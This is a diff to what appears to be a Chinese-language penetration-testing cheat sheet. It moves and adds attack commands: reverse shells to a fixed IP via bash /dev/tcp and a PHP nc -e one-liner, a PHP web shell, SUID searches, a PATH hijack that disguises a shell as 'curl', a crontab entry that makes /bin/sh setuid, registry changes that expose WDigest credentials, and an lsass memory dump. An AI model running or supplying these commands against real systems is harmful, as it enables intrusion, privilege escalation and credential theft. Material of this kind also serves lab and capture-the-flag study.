@@ -62,8 +62,6 @@ reboot                  //重启
 
 ```
 bash -c 'sh -i &>/dev/tcp/192.168.253.139/4444 0>&1'
-<?php system("nc -e /bin/sh 192.168.253.136  4444"); ?>
-echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
 find / -user root -perm -4000 -print 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} ;
 find / -perm -u=s -type f 2>/dev/null
@@ -84,6 +82,14 @@ php -a 然后 exec("sh -i");
 perl -e 'exec "/bin/sh";'
 ruby -e 'exec "/bin/sh"'
 Lua:os.execute('/bin/sh').
+-------------------------------------------------------
+cd /tmp
+# cp,vim,nano
++ echo "/bin/bash" > curl
++ chmod 777 curl
+- ln -s /bin/sh curl
+export PATH=/tmp:$PATH
+echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
 -------------------------------------------------------
 ssh user@IP - t "/bin/sh"或"/bin/bash"
 ssh user@IP -t "bash --noprofile"
@@ -152,6 +158,15 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
 rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
 procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
+```
+
+## Control
+
+- PHP
+
+```
+<?php system($_GET['cmd']); ?>
+<?php system("nc -e /bin/sh 192.168.253.136  4444"); ?>
 ```
 
 ## Tools
